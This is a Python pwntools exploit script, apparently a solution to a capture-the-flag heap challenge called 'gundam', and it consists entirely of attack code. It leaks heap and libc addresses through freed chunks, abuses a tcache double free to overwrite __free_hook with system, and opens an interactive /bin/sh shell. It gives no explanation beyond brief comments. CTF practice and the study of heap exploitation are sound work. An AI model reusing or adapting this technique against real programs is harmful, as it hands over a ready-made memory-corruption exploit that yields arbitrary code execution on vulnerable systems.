from pwn import *

os.environ['LD_PRELOAD'] = './libc.so.6'
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = process('./gundam')
e = ELF('./gundam')

def build(name):
    r.sendlineafter('Your choice : ', '1')
    r.sendafter('The name of gundam :', name)
    r.sendlineafter('The type of the gundam :', '0')
def visit():
    r.sendlineafter('Your choice : ', '2')
def destroy(idx):
    r.sendlineafter('Your choice : ', '3')
    r.sendlineafter('Which gundam do you want to Destory:', str(idx))
def destroy_all():
    r.sendlineafter('Your choice : ', '4')

# leak heap base
build('A')
build('A')
destroy(0)
destroy(1)
build('A')
visit()
r.recvuntil('Gundam[2] :A')
heap_base = u64('\x00'+r.recv(5)+'\x00\x00')-0x200
log.info('heap base: %#x' % heap_base)
destroy_all()

# leak libc
for i in range(8):
    build('A')
for i in range(8):
    destroy(i)
destroy_all()
for i in range(7):
    build('A')
build('A'*8)
visit()
r.recvuntil('Gundam[7] :AAAAAAAA')
libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['__malloc_hook'] - 0x68
system = libc_base + libc.symbols['system']
__free_hook = libc_base + libc.symbols['__free_hook']
log.info('libc base: %#x' % libc_base)

# double free
destroy(2)# free for later malloc
destroy(3)# free for later malloc
destroy(0)# double free
destroy(0)# double free
destroy_all()
build(p64(__free_hook))
build('/bin/sh\x00')
build(p64(system))
destroy(2)

r.interactive()
